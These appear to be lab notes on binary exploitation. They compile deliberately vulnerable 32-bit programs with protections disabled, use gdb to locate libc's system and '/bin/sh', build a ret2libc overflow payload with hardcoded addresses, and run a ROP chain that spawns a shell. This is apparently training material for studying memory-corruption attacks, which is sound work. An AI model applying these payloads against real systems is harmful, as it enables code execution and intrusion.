gcc -o example -m32 -fno-stack-protector -z execstack -fno-pie -no-pie example.c

gdb example

1. print system
    >> $1 {int}... *addr* <__libc_system>
2. find *addr that's shown in above print cmd*, +999999999, "/bin/sh"
    >> *addr*
    >> "warning: unable to access 16000 bytes of target..."
3. disas bad #looking for size of actual buffer
    >> dump of disas...
    >> *at "lea" there's an offset --> eax,[ebp-0x6c]*
4. r $(python2 -c 'print("A" * offset + "BBBB" + "libc_system" + "CCCC" + "find addr")')
r $(python -c 'print("A" * 0x6c + "BBBB" + "\x90\x87\xe0\xf7" + "CCCC" + "\x63\x53\xf5\xf7")')

*******************************
gcc -o rop_example -m32 -fno-stack-protector -z execstack -fno-pie -no-pie rop_example.c

mamba install ropgadget

gdb ./rop_example

1. rop --grep 'pop'
    >> *prints all uses of pop*
    *use first pop with ret as "pop_ret_gadget"*
2. print exec_string
    >> $1 *addr* <exec_string>
3. print add_all
    >> *addr* <add_all>
4. print add_all_args
    >> *addr* <add_all_args>
. quit
. python2 rop.py
    >> $ *shell*
